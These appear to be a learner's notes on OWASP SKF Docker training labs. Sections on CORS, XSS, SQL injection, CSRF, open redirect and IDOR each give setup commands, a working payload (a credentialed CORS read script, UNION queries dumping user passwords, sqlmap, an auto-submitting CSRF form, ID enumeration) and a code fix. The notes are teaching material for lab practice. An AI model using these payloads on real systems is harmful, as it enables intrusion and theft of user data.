# How to connect to docker
always run your container with --name myContainer
So you can easily connect by:
docker exec -it myContainer /bin/sh
instead of getting the run-time specific container ID first

# For simplicity, change /etc/hosts
Map your local IP to some name in /etc/hosts
<ip> asdf

or just use localhost:
docker run -ti -p 127.0.0.1:5000:5000 -p 127.0.0.1:1337:1337 blabla1337/owasp-skf-lab:xxxx


# CORS
## Preparation
docker pull blabla1337/owasp-skf-lab:cors
docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:cors

Note: Run with multiple ports exposed:
docker run -ti -p <ip>:5000:5000 -p <ip>:1337:1337 blabla1337/owasp-skf-lab:cors

## Exploit
edit request, add:
Origin:blabla.nl
-> it gets reflected in the Access-Control-Allow-Origin header

connect to docker and start the evil application:
python3 evil_server.py

edit evil.html and add this script:
```<script>

var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','http://<ip>:5000/confidential', true);
req.withCredentials = true;
req.send();
function reqListener(){
document.getElementById("cors").innerHTML= req.responseText;
}
</script>```
## Fix
replace:
    cors = CORS(app, resources={r"/*": {"origins": "*"}})^M
with:
    cors = CORS(app, resources={r"/*": {"origins": "asdf"}})^M


# XSS
## Preparation
docker pull blabla1337/owasp-skf-lab:cross-site-scripting
docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:cross-site-scripting
## Exploit
<script>alert('1')</script>asdf
This will work in Firefox but not in Chrome since Chrome has XSS Auditor implemented.
## Fix
cd templates
change index.html autoescape from false to true


# sql-injection
##Preparation
docker pull blabla1337/owasp-skf-lab:sql-injection
docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:sql-injection
## Exploit
<ip>:5000/home/1'
-> causes error

<ip>:5000/home/1 union select 1
<ip>:5000/home/1 union select 1,2
<ip>:5000/home/1 union select 1,2,3
-> enumerate how many columns there are. in this case 3

Note: Users was a hint in the how-to. So we did not need to find this ourselves
<ip>:5000/home/1 union select 1,username,password from users
## Fix
cd models
vi sqlimodel.py
            #cur = db.execute('SELECT pageId, title, content FROM pages WHERE pageId='+pageId)
            cur = db.execute('SELECT pageId, title, content FROM pages WHERE pageId=?',pageId)

!! Careful, this is python, so spaces matter !!


# sql-injection-like
## Preparation
docker pull blabla1337/owasp-skf-lab:sql-injection-like
docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:sql-injection-like
## Exploit
use comment
or automated:
python3 sqlmap.py --all --url http://<ip>:50000/home/admin
## Fix
cd models
```
#cur = db.execute('SELECT pageId, title, content FROM pages WHERE pageId='+pageId)
cur = db.execute('SELECT pageId, title, content FROM pages WHERE pageId=?',pageId)
```

# Cross-site-request-forgery
## Preparation
docker pull blabla1337/owasp-skf-lab:cross-site-request-forgery
docker run -ti -p <ip>:5000:5000 -p <ip>:1337:1337 blabla1337/owasp-skf-lab:cross-site-request-forgery
as with CORS, also start the evil server here
## Exploit
make sure your evil server evil.html file includes the following script:
```<iframe style="display:none" name="csrf-frame"></iframe>
<form method='POST' action='http://<ip>:5000/update' target="csrf-frame" id="csrf-form">
  <input type='hidden' name='color' value='Hackzord!'>
  <input type='submit' value='submit'>                                                
</form>                                              
<script>document.getElementById("csrf-form").submit()</script>```
This overwrites the color value. When you refresh the normal application you can see the damage.
## Fix
add hidden input field:
```<input type="hidden" name="CSRFToken"
value="OWY4NmQwODE4ODRjN2Q2NTlhMmZlYWEwYzU1YWQwMTVhM2JmNGYxYjJiMGI4MjJjZDE1ZDZMGYwMGEwOA==">```
and in the application check for the value:
```if not request.form['CSRFToken']=="OWY4NmQwODE4ODRjN2Q2NTlhMmZlYWEwYzU1YWQwMTVhM2JmNGYxYjJiMGI4MjJjZDE1ZDZMGYwMGEwOA==":^M
        return render_template('index.html')```
Very hacky example of course, this should not be one fixed value.

For the flask framework, see https://flask-wtf.readthedocs.io/en/stable/csrf.html
```
from flask_wtf.csrf import CSRFProtect
csrf = CSRFProtect(app)
```


# Open redirect
## Preparation
docker pull blabla1337/owasp-skf-lab:url-redirect
docker pull blabla1337/owasp-skf-lab:url-redirect-hard
docker pull blabla1337/owasp-skf-lab:url-redirect-harder
docker pull blabla1337/owasp-skf-lab:url-redirect-harder2
docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:url-redirect-hard
## Exploit
<ip>:5000/redirect?newurl=www.malicioussite.nl
## Fix
```def redirector():
    whitelist = ["home", "dashboard"]
    landing_page = request.args.get('newurl')
    if landing_page in whitelist:
        return redirect("http://www.localhost:5000/" + landing_page, 302)```
whitelist specific redirects that are allowed


# IDOR
## Preparation
docker pull blabla1337/owasp-skf-lab:idor
docker run -ti -p <ip>:5000:5000 blabla1337/owasp-skf-lab:idor
## Exploit
enumerate create a pdf and check result with id
try out random ids
then intercept this POST /download and send it to intruder
mark the id clear and add button
Payload type numbers and choose range
(( OR: then go to payloads and add a list to "Payload Options [Simple list]"/load
for i in {1..1000} ; do echo $i >> a.txt ; done ;
))
run under "Positions"/"Start attack" and check for varying response content length.
We can see that the response length for payload 20 is different
so go back to the website and download the pdf for id=20
## Fix
A real fix would be checking for authorization but there is not even authentication in place, so this would be quite some work.
The "quick-fix" in the challenge is commenting out the generation of the pdf and removing it from the server. Then it's not accessible anymore.